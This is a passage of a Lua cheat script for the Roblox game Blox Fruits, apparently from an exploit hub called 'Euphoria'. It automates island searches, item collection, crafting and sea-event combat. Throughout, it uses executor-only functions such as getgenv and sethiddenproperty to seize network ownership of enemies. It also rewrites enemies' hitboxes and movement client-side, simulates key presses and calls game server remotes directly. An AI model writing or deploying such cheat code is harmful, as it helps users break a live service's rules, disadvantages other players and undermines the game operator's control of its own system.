                            SeaDanger5BringPos = CFrame.new(-38409.1055, 3.35565066, 3538.43701, -0.064785257, 1.32857552e-15, 0.997899234, -1.73704636e-15, 1, -1.44414438e-15, -0.997899234, -1.82695647e-15, -0.064785257)
                            SeaDanger5Waypoints = {
                                CFrame.new(-46317.9414, 19.3556461, 7825.96094, -0.99994415, 3.02188639e-08, 0.0105693713, 3.11131103e-08, 1, 8.44431085e-08, -0.0105693713, 8.47672368e-08, -0.99994415),
                                CFrame.new(-46529.7871, 16.279829, 6990.2041, 0.69260025, 3.93635951e-08, -0.721321642, 7.52798925e-08, 1, 1.26853905e-07, 0.721321642, -1.42160062e-07, 0.69260025),
                                CFrame.new(-46814.1289, 19.3556461, 4124.68164, 0.730453014, -1.21849226e-07, 0.682962954, 6.75700704e-08, 1, 1.06144078e-07, -0.682962954, -3.13854081e-08, 0.730453014),
                                CFrame.new(-46540.2148, 19.0456848, 382.093201, 0.964051366, -4.15628776e-08, 0.265715957, 4.25003499e-08, 1, 2.22175878e-09, -0.265715957, 9.1511323e-09, 0.964051366),
                                CFrame.new(-48969.0781, 19.3556461, -3201.8501, 0.994422197, -1.66379905e-08, 0.105472721, 1.0503582e-08, 1, 5.87165694e-08, -0.105472721, -5.72812198e-08, 0.994422197),
                                CFrame.new(-48257.082, 19.3556461, -6701.3335, 0.98023206, -6.88214019e-09, -0.197851136, -8.92395136e-09, 1, -7.89971892e-08, 0.197851136, 7.92011932e-08, 0.98023206),
                                CFrame.new(-48532.4609, 19.3556461, -8530.47754, 0.76733923, -2.11108464e-09, 0.641241431, 4.2145083e-09, 1, -1.75109216e-09, -0.641241431, 4.04619893e-09, 0.76733923),
                                CFrame.new(-48567.7969, 19.3556461, -5447.55273, -0.982734621, -2.79101684e-08, 0.185020611, -2.580847e-08, 1, 1.37676075e-08, -0.185020611, 8.75480666e-09, -0.982734621),
                                CFrame.new(-48563.875, 19.3556461, -2665.32642, -0.956179023, -5.25171684e-09, -0.292782545, -1.50302402e-08, 1, 3.11489998e-08, 0.292782545, 3.41846125e-08, -0.956179023)
                            }
                            
                            if not getMyBoat() then
                                if getDistance(BoatPos) > 20 then
                                    if useNearestEntrance(BoatPos) then
                                        StopTween()
                                    end
                                    toPoint(BoatPos)
                                else
                                    buyBoat()
                                end
                            else
                                if getDistanceBoat(TikiPos) < 500 then
                                    bringBoat(SeaDanger5BringPos)
                                end
                                if _G.BoatingMirage and not isOnBoat() then
                                    toBoat()
                                end
                                if isOnBoat() then
                                    if not _G.SeaDanger4WaypointIndex or _G.SeaDanger4WaypointIndex > #SeaDanger5Waypoints then
                                        _G.SeaDanger4WaypointIndex = 1
                                    end
                                    if getDistanceBoat(SeaDanger5Waypoints[_G.SeaDanger4WaypointIndex]) < 100 then
                                        _G.SeaDanger4WaypointIndex = _G.SeaDanger4WaypointIndex + 1
                                    else
                                        tweenBoat(SeaDanger5Waypoints[_G.SeaDanger4WaypointIndex])
                                    end
                                end
                            end
                        end
                    end)
                    if ea then print(ea) end
                end
            end)

            AutoGear = MirageSection:NewToggle("Auto Blue Gear [ Default ]", function(state)
                getgenv().EuphoriaSettings["Auto Gear"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Gear"] then AutoGear:UpdateToggle(nil, true) end
            AutoHopIfNoMirage = MirageSection:NewToggle("Auto Hop If No Mirage", function(state)
                getgenv().EuphoriaSettings["Auto Hop If No Mirage"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Hop If No Mirage"] then AutoHopIfNoMirage:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Hop If No Mirage"] then 
                            _G.AutoHopIfNoMirage = true 
                        else 
                            _G.AutoHopIfNoMirage = false 
                        end
                    end)
                end
            end)

            function IsPossibleToDoMirage()
                if not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then return false end
                timeForMirage = math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)) / _G.TweenSpeed)
                time = game:GetService("Lighting").ClockTime
                if time >= 17.5 - (timeForMirage / 60) or time < 4.8 - (timeForMirage / 60) then
                    return true
                else
                    return false
                end
            end

            function IsNight()
                time = game:GetService("Lighting").ClockTime
                if time >= 18 then
                    return true
                end
                if time < 5 then
                    return true
                end
                return false
            end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Gear"] then 
                            _G.AutoGear = true 
                        else 
                            _G.AutoGear = false 
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.BlueGear then break end
                    pcall(function()
                        if GetMaterial("Mirror Fractal") == 0 or not isAccessoryInInventory("Valkyrie Helm") then
                            return
                        end
                        if PlayerData.BlueGear then
                            return
                        end
                        if getgenv().EuphoriaSettings["Auto Gear"] and tonumber(PlayerData.V4Status) ~= 4 and GetMaterial("Mirror Fractal") > 0 and isAccessoryInInventory("Valkyrie Helm") then
                            if tonumber(PlayerData.V4Status) == 1 then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Begin")
                                return
                            end
                            if tonumber(PlayerData.V4Status) == 2 then
                                if getDistance(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353)) > 500 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                                    toPoint(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353))
                                    return
                                else
                                    if getDistance(CFrame.new(28609.6914, 14896.5332, 106.819748, 0.211734429, -3.73081122e-09, -0.977327228, -4.00236644e-09, 1, -4.68445993e-09, 0.977327228, 4.9034834e-09, 0.211734429)) < 20 then
                                        wait(1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","TeleportBack")
                                        wait(.5)
                                        toPoint(CFrame.new(2956.01245, 2282.23022, -7215.73926, 0.526488245, -3.62312811e-08, -0.850182414, -4.38758612e-08, 1, -6.97866724e-08, 0.850182414, 7.40443511e-08, 0.526488245))
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Teleport")
                                    end
                                    return
                                end
                                return
                            end
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Continue")
                            return
                        end
                        if _G.AutoGear then
                            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") and IsPossibleToDoMirage() and tonumber(PlayerData.V4Status) == 4 then
                                repeat wait()
                                    MiragePoint = CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)
                                    if useNearestEntrance(MiragePoint) then
                                        StopTween()
                                    end
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    toPoint(MiragePoint)
                                    gearFound = false
                                    for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                                        if v:IsA("MeshPart") then 
                                            if v.Material == Enum.Material.Neon and v.Transparency == 0 then  
                                                gearFound = v
                                            end
                                        end
                                    end
                                    if not gearFound then
                                        if PlayerData.BlueGear then
                                            return
                                        end
                                        if getDistance(MiragePoint) < 200 and IsNight() then
                                            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                                        end
                                    else
                                        repeat wait()
                                            toPoint(gearFound.CFrame)
                                        until not gearFound or not gearFound.Parent or gearFound.Transparency == 1 or not _G.AutoGear
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        wait()
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        wait()
                                    end
                                until not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") or not _G.AutoGear
                            else
                                if getDistance(CFrame.new(-16220.6738, 28.6496544, 447.947723)) > 100 then 
                                    if useNearestEntrance(CFrame.new(-16220.6738, 28.6496544, 447.947723)) then
                                        StopTween()
                                    end
                                    toPoint(CFrame.new(-16220.6738, 28.6496544, 447.947723))
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                else
                                    if _G.AutoHopIfNoMirage then
                                        if not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") and tonumber(PlayerData.V4Status) == 4 then
                                            wait(5)
                                            HopToLowestServer()
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end)

            local KitsuneIslandSection = SeaEventTab:NewSection("Kitsune Island")
            AutoFindKitsuneIslandToggle = KitsuneIslandSection:NewToggle("Auto Find Kitsune Island", function(state)
                getgenv().EuphoriaSettings["Auto Find Kitsune Island"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Find Kitsune Island"] then AutoFindKitsuneIslandToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Find Kitsune Island"] then 
                            AutoFindKitsuneIsland = true 
                        else 
                            AutoFindKitsuneIsland = false 
                            BoatingKitsuneIsland = false
                        end
                    end)
                end
            end)
            BoatingKitsuneIsland = false
            SeaDanger5WaypointIndex = 1

            -- Script generated by SimpleSpy - credits to exx#9394

            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoFindKitsuneIsland then
                            if game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") then
                                BoatingKitsuneIsland = false
                                repeat wait()
                                    dismountBoat()
                                    stopBoat()
                                    KitsuneIslandPoint = game.Workspace.Map.KitsuneIsland.ShrineActive.NeonShrinePart.CFrame * CFrame.new(0,40,10)
                                    if useNearestEntrance(KitsuneIslandPoint) then
                                        StopTween()
                                    end
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    toPoint(KitsuneIslandPoint)
                                    if getDistance(KitsuneIslandPoint) < 100 and not game:GetService("Workspace"):FindFirstChild("AttachedAzureEmber") then
                                        game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RE/TouchKitsuneStatue"):FireServer()
                                    elseif getDistance(KitsuneIslandPoint) < 100 then
                                        wait(5)
                                    end
                                until not game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") or not AutoFindKitsuneIsland
                            else
                                BoatingKitsuneIsland = true
                            end
                        end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    local sa, ea = pcall(function()
                        if third_sea and BoatingKitsuneIsland then
                            BoatPos = CFrame.new(-16208.5752, 9.08636189, 407.685608, 0.87449646, 1.22196955e-08, -0.485031873, 2.7691156e-08, 1, 7.51198357e-08, 0.485031873, -7.91231187e-08, 0.87449646)
                            TikiPos = CFrame.new(-16207.3916, 9.08636189, 442.4935, -0.289960057, 1.5374928e-09, -0.95703876, 1.00728599e-07, 1, -2.89118667e-08, 0.95703876, -1.04784462e-07, -0.289960057)
                            
                            SeaDanger5BringPos = CFrame.new(-38409.1055, 3.35565066, 3538.43701, -0.064785257, 1.32857552e-15, 0.997899234, -1.73704636e-15, 1, -1.44414438e-15, -0.997899234, -1.82695647e-15, -0.064785257)
                            SeaDanger5Waypoints = {
                                CFrame.new(-46317.9414, 19.3556461, 7825.96094, -0.99994415, 3.02188639e-08, 0.0105693713, 3.11131103e-08, 1, 8.44431085e-08, -0.0105693713, 8.47672368e-08, -0.99994415),
                                CFrame.new(-46529.7871, 16.279829, 6990.2041, 0.69260025, 3.93635951e-08, -0.721321642, 7.52798925e-08, 1, 1.26853905e-07, 0.721321642, -1.42160062e-07, 0.69260025),
                                CFrame.new(-46814.1289, 19.3556461, 4124.68164, 0.730453014, -1.21849226e-07, 0.682962954, 6.75700704e-08, 1, 1.06144078e-07, -0.682962954, -3.13854081e-08, 0.730453014),
                                CFrame.new(-46540.2148, 19.0456848, 382.093201, 0.964051366, -4.15628776e-08, 0.265715957, 4.25003499e-08, 1, 2.22175878e-09, -0.265715957, 9.1511323e-09, 0.964051366),
                                CFrame.new(-48969.0781, 19.3556461, -3201.8501, 0.994422197, -1.66379905e-08, 0.105472721, 1.0503582e-08, 1, 5.87165694e-08, -0.105472721, -5.72812198e-08, 0.994422197),
                                CFrame.new(-48257.082, 19.3556461, -6701.3335, 0.98023206, -6.88214019e-09, -0.197851136, -8.92395136e-09, 1, -7.89971892e-08, 0.197851136, 7.92011932e-08, 0.98023206),
                                CFrame.new(-48532.4609, 19.3556461, -8530.47754, 0.76733923, -2.11108464e-09, 0.641241431, 4.2145083e-09, 1, -1.75109216e-09, -0.641241431, 4.04619893e-09, 0.76733923),
                                CFrame.new(-48567.7969, 19.3556461, -5447.55273, -0.982734621, -2.79101684e-08, 0.185020611, -2.580847e-08, 1, 1.37676075e-08, -0.185020611, 8.75480666e-09, -0.982734621),
                                CFrame.new(-48563.875, 19.3556461, -2665.32642, -0.956179023, -5.25171684e-09, -0.292782545, -1.50302402e-08, 1, 3.11489998e-08, 0.292782545, 3.41846125e-08, -0.956179023)
                            }
                            
                            if not getMyBoat() then
                                if getDistance(BoatPos) > 20 then
                                    if useNearestEntrance(BoatPos) then
                                        StopTween()
                                    end
                                    toPoint(BoatPos)
                                else
                                    buyBoat()
                                end
                            else
                                if getDistanceBoat(TikiPos) < 500 then
                                    bringBoat(SeaDanger5BringPos)
                                end
                                if BoatingKitsuneIsland and not isOnBoat() then
                                    toBoat()
                                end
                                if isOnBoat() then
                                    if not SeaDanger5WaypointIndex or SeaDanger5WaypointIndex > #SeaDanger5Waypoints then
                                        SeaDanger5WaypointIndex = 1
                                    end
                                    if getDistanceBoat(SeaDanger5Waypoints[SeaDanger5WaypointIndex]) < 100 then
                                        SeaDanger5WaypointIndex = SeaDanger5WaypointIndex + 1
                                    else
                                        tweenBoat(SeaDanger5Waypoints[SeaDanger5WaypointIndex])
                                    end
                                end
                            end
                        end
                    end)
                    if ea then print(ea) end
                end
            end)

            AutoCollectAzureEmberToggle = KitsuneIslandSection:NewToggle("Auto Collect Azure Ember", function(state)
                getgenv().EuphoriaSettings["Auto Collect Azure Ember"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Collect Azure Ember"] then AutoCollectAzureEmberToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Collect Azure Ember"] then 
                            AutoCollectAzureEmber = true 
                        else 
                            AutoCollectAzureEmber = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoCollectAzureEmber then
                            if game:GetService("Workspace"):FindFirstChild("AttachedAzureEmber") then
                                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - game:GetService("Workspace"):WaitForChild("EmberTemplate"):FindFirstChild("Part").CFrame.Position).Magnitude > 700 then
                                    toPoint(game:GetService("Workspace"):WaitForChild("EmberTemplate"):FindFirstChild("Part").CFrame)
                                    game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RE/CollectBlueEmber"):FireServer()

                                else
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.EmberTemplate.Part.CFrame
                                    game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RE/CollectBlueEmber"):FireServer()

                                end
                            end
                        end
                    end)
                end
            end)

            AutoTradeAzureEmberToggle = KitsuneIslandSection:NewToggle("Auto Trade Azure Ember > 20", function(state)
                getgenv().EuphoriaSettings["Auto Trade Azure Ember"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Trade Azure Ember"] then AutoTradeAzureEmberToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Trade Azure Ember"] then 
                            AutoTradeAzureEmber = true 
                        else 
                            AutoTradeAzureEmber = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoTradeAzureEmber then
                            if game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") then
                                if GetMaterial("Azure Ember") >= 20 then
                                    game:GetService("ReplicatedStorage").Modules.Net:FindFirstChild("RF/KitsuneStatuePray"):InvokeServer()
                                end
                            end
                        end
                    end)
                end
            end)


            


            local SeaEventItems = SeaEventTab:NewSection("Sea Event Items")
            AutoSharkAnchor = SeaEventItems:NewToggle("Auto Shark Anchor", function(state)
                getgenv().EuphoriaSettings["Auto Shark Anchor"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Shark Anchor"] then AutoSharkAnchor:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().EuphoriaSettings["Auto Shark Anchor"] then
                            _G.AutoSharkAnchor = true
                        else
                            _G.AutoSharkAnchor = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait(4) do
                    pcall(function()
                        if _G.AutoSharkAnchor then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem","PossibleHardcode","SharkAnchor")
                            wait(.1)
                            if not isAccessoryInInventory("Terror Jaw") then
                                if GetMaterial("Terror Eyes") >= 1 and GetMaterial("Mutant Tooth") >= 2 and GetMaterial("Fool's Gold") >= 10 and GetMaterial("Shark Tooth") >= 5 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Check", "TerrorJaw")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Craft", "TerrorJaw")
                                end
                            end
                            if not isAccessoryInInventory("Shark Tooth Necklace") then
                                if GetMaterial("Mutant Tooth") >= 1 and GetMaterial("Shark Tooth") >= 5 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Check", "ToothNecklace")
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Craft", "ToothNecklace")
                                end
                            end
                            if isAccessoryInInventory("Shark Tooth Necklace") and isAccessoryInInventory("Terror Jaw") then
                                if GetMaterial("Terror Eyes") >= 2 and GetMaterial("Electric Wing") >= 8 and GetMaterial("Fool's Gold") >= 20 and GetMaterial("Shark Tooth") >= 10 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Check", "SharkAnchor")
                                    wait(.1)
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CraftItem", "Craft", "SharkAnchor")
                                end
                            end
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    local sa, ea = pcall(function()
                        if third_sea and _G.AutoSharkAnchor and not _G.AttackSeaEvent then
                            BoatPos = CFrame.new(-16208.5752, 9.08636189, 407.685608, 0.87449646, 1.22196955e-08, -0.485031873, 2.7691156e-08, 1, 7.51198357e-08, 0.485031873, -7.91231187e-08, 0.87449646)
                            TikiPos = CFrame.new(-16207.3916, 9.08636189, 442.4935, -0.289960057, 1.5374928e-09, -0.95703876, 1.00728599e-07, 1, -2.89118667e-08, 0.95703876, -1.04784462e-07, -0.289960057)
                            
                            SeaDanger5BringPos = CFrame.new(-38409.1055, 3.35565066, 3538.43701, -0.064785257, 1.32857552e-15, 0.997899234, -1.73704636e-15, 1, -1.44414438e-15, -0.997899234, -1.82695647e-15, -0.064785257)
                            SeaDanger5Waypoints = {
                                CFrame.new(-46317.9414, 19.3556461, 7825.96094, -0.99994415, 3.02188639e-08, 0.0105693713, 3.11131103e-08, 1, 8.44431085e-08, -0.0105693713, 8.47672368e-08, -0.99994415),
                                CFrame.new(-46529.7871, 16.279829, 6990.2041, 0.69260025, 3.93635951e-08, -0.721321642, 7.52798925e-08, 1, 1.26853905e-07, 0.721321642, -1.42160062e-07, 0.69260025),
                                CFrame.new(-46814.1289, 19.3556461, 4124.68164, 0.730453014, -1.21849226e-07, 0.682962954, 6.75700704e-08, 1, 1.06144078e-07, -0.682962954, -3.13854081e-08, 0.730453014),
                                CFrame.new(-46540.2148, 19.0456848, 382.093201, 0.964051366, -4.15628776e-08, 0.265715957, 4.25003499e-08, 1, 2.22175878e-09, -0.265715957, 9.1511323e-09, 0.964051366),
                                CFrame.new(-48969.0781, 19.3556461, -3201.8501, 0.994422197, -1.66379905e-08, 0.105472721, 1.0503582e-08, 1, 5.87165694e-08, -0.105472721, -5.72812198e-08, 0.994422197),
                                CFrame.new(-48257.082, 19.3556461, -6701.3335, 0.98023206, -6.88214019e-09, -0.197851136, -8.92395136e-09, 1, -7.89971892e-08, 0.197851136, 7.92011932e-08, 0.98023206),
                                CFrame.new(-48532.4609, 19.3556461, -8530.47754, 0.76733923, -2.11108464e-09, 0.641241431, 4.2145083e-09, 1, -1.75109216e-09, -0.641241431, 4.04619893e-09, 0.76733923),
                                CFrame.new(-48567.7969, 19.3556461, -5447.55273, -0.982734621, -2.79101684e-08, 0.185020611, -2.580847e-08, 1, 1.37676075e-08, -0.185020611, 8.75480666e-09, -0.982734621),
                                CFrame.new(-48563.875, 19.3556461, -2665.32642, -0.956179023, -5.25171684e-09, -0.292782545, -1.50302402e-08, 1, 3.11489998e-08, 0.292782545, 3.41846125e-08, -0.956179023)
                            }
                            
                            if not getMyBoat() then
                                if getDistance(BoatPos) > 20 then
                                    if useNearestEntrance(BoatPos) then
                                        StopTween()
                                    end
                                    toPoint(BoatPos)
                                else
                                    buyBoat()
                                end
                            else
                                if getDistanceBoat(TikiPos) < 500 then
                                    bringBoat(SeaDanger5BringPos)
                                end
                                if not _G.AttackSeaEvent and not isOnBoat() then
                                    toBoat()
                                end
                                if isOnBoat() then
                                    if not _G.SeaDanger4WaypointIndex or _G.SeaDanger4WaypointIndex > #SeaDanger5Waypoints then
                                        _G.SeaDanger4WaypointIndex = 1
                                    end
                                    if getDistanceBoat(SeaDanger5Waypoints[_G.SeaDanger4WaypointIndex]) < 20 then
                                        _G.SeaDanger4WaypointIndex = _G.SeaDanger4WaypointIndex + 1
                                    else
                                        tweenBoat(SeaDanger5Waypoints[_G.SeaDanger4WaypointIndex])
                                    end
                                end
                            end
                        end
                    end)
                    if ea then print(ea) end
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor then
                            if GetMaterial("Monster Magnet") <= 0 then
                                for i,v in game.Workspace.Enemies:GetChildren() do
                                    if v.Name == "Terrorshark" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v.Humanoid.MaxHealth > 150000 then
                                        _G.AttackSeaEvent = true
                                        _G.SeaEventImmuneToPhys = false
                                        _G.SeaEventTarget = v
                                        dismountBoat()
                                        stopBoat()
                                        return
                                    end
                                end
                                -- Terror shark
                                for i,v in game.Workspace.Enemies:GetChildren() do
                                    if v.Name == "Terrorshark" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                        _G.AttackSeaEvent = true
                                        _G.SeaEventImmuneToPhys = false
                                        _G.SeaEventTarget = v
                                        dismountBoat()
                                        stopBoat()
                                        return
                                    end
                                end
                                
                                if GetMaterial("Fool's Gold") < 30 then
                                    for i,v in game.Workspace.Enemies:GetChildren() do
                                        if v.Name == "PirateGrandBrigade" and v.Health.Value > 0 then
                                            _G.AttackSeaEvent = true
                                            _G.SeaEventImmuneToPhys = true
                                            _G.SeaEventTarget = v
                                            dismountBoat()
                                            stopBoat()
                                            return
                                        end
                                    end
                                    for i,v in game.Workspace.Enemies:GetChildren() do
                                        if v.Name == "PirateBrigade" and v.Health.Value > 0 then
                                            _G.AttackSeaEvent = true
                                            _G.SeaEventImmuneToPhys = true
                                            _G.SeaEventTarget = v
                                            dismountBoat()
                                            stopBoat()
                                            return
                                        end
                                    end
                                    for i,v in game.Workspace.Enemies:GetChildren() do
                                        if v.Name == "FishBoat" and v.Health.Value > 0 then
                                            _G.AttackSeaEvent = true
                                            _G.SeaEventImmuneToPhys = true
                                            _G.SeaEventTarget = v
                                            dismountBoat()
                                            stopBoat()
                                            return
                                        end
                                    end
                                end
                                if GetMaterial("Electric Wing") < 8 then
                                    for i,v in game.Workspace.Enemies:GetChildren() do
                                        if v.Name == "Piranha" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                            _G.AttackSeaEvent = true
                                            _G.SeaEventImmuneToPhys = false
                                            _G.SeaEventTarget = v
                                            dismountBoat()
                                            stopBoat()
                                            return
                                        end
                                    end
                                end
                                if GetMaterial("Shark Tooth") < 20 then
                                    for i,v in game.Workspace.Enemies:GetChildren() do
                                        if v.Name == "Shark" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                            _G.AttackSeaEvent = true
                                            _G.SeaEventImmuneToPhys = false
                                            _G.SeaEventTarget = v
                                            dismountBoat()
                                            stopBoat()
                                            return
                                        end
                                    end
                                end
                                _G.AttackSeaEvent = false
                                _G.SeaEventTarget = nil
                                _G.SeaEventImmuneToPhys = false
                            end
                        end
                        _G.AttackSeaEvent = false
                        _G.SeaEventTarget = nil
                        _G.SeaEventImmuneToPhys = false
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor and _G.AttackSeaEvent and _G.SeaEventTarget then
                            if not _G.SeaEventImmuneToPhys then
                                repeat task.wait()
                                    
                                    EquipWeapon(_G.SelectWeapon)
                                    if not _G.SeaEventDodgeState or _G.SeaEventDodgeState == 0 then
                                        if _G.SeaEventTarget.Name == "Terrorshark" then
                                            toTarget(_G.SeaEventTarget.HumanoidRootPart.CFrame * CFrame.new(math.random(-15, 15),54,math.random(-15, 15)))
                                        elseif _G.SeaEventTarget.Name == "Shark" then
                                            toTarget(_G.SeaEventTarget.HumanoidRootPart.CFrame * CFrame.new(10,30,-10))
                                        else
                                            toTarget(_G.SeaEventTarget.HumanoidRootPart.CFrame * CFrame.new(10,5,-10))
                                        end
                                    else
                                        toTarget(_G.SeaEventTarget.HumanoidRootPart.CFrame * CFrame.new(100,240,40))
                                    end
                                    if _G.SeaEventTarget.Name == "Terrorshark" then
                                        PosMon = nil
                                        BringMobFarm = false
                                        sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                    elseif _G.SeaEventTarget.Name == "Shark" then
                                        PosMon = nil
                                        BringMobFarm = false
                                        sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                    else 
                                        bringBoat(CFrame.new(_G.SeaEventTarget.HumanoidRootPart.CFrame.X, 0, _G.SeaEventTarget.HumanoidRootPart.CFrame.Z) * CFrame.new(40,10,0))
                                        BringMobFarm = true
                                        PosMon = CFrame.new(_G.SeaEventTarget.HumanoidRootPart.CFrame.X, 0, _G.SeaEventTarget.HumanoidRootPart.CFrame.Z)
                                        _G.SeaEventTarget.HumanoidRootPart.CFrame = CFrame.new(_G.SeaEventTarget.HumanoidRootPart.CFrame.X, 0, _G.SeaEventTarget.HumanoidRootPart.CFrame.Z)
                                        _G.SeaEventTarget.Humanoid.JumpPower = 0
                                        _G.SeaEventTarget.Humanoid.WalkSpeed = 0
                                        _G.SeaEventTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        _G.SeaEventTarget.HumanoidRootPart.Transparency = 1
                                        _G.SeaEventTarget.HumanoidRootPart.CanCollide = false
                                        _G.SeaEventTarget.Head.CanCollide = false
                                        if _G.SeaEventTarget.Humanoid:FindFirstChild("Animator") then
                                            _G.SeaEventTarget.Humanoid.Animator:Destroy()
                                        end
                                        _G.SeaEventTarget.Humanoid:ChangeState(11)
                                        _G.SeaEventTarget.Humanoid:ChangeState(14)
                                        sethiddenproperty(LP, "SimulationRadius",  math.huge)
                                    end
                                until not _G.AutoSharkAnchor or not _G.SeaEventTarget or not _G.SeaEventTarget.Parent or _G.SeaEventTarget.Humanoid.Health <= 0
                            else
                                repeat wait()
                                    _G.SeaEventAttackBoat = true
                                    if getDistance(_G.SeaEventTarget.VehicleSeat.CFrame) < 100 then
                                        _G.AimbotPos = _G.SeaEventTarget.VehicleSeat.CFrame
                                        AvailableTools = {}
                                        if LP.Data.Stats.Melee.Level.Value > 500 then
                                            table.insert(AvailableTools, "Melee")
                                        end
                                        if LP.Data.Stats["Demon Fruit"].Level.Value > 500 then  
                                            table.insert(AvailableTools, "Blox Fruit")
                                        end
                                        if LP.Data.Stats.Sword.Level.Value > 500 then
                                            table.insert(AvailableTools, "Sword")
                                        end
                                        if LP.Data.Stats.Gun.Level.Value > 500 then
                                            table.insert(AvailableTools, "Gun")
                                        end
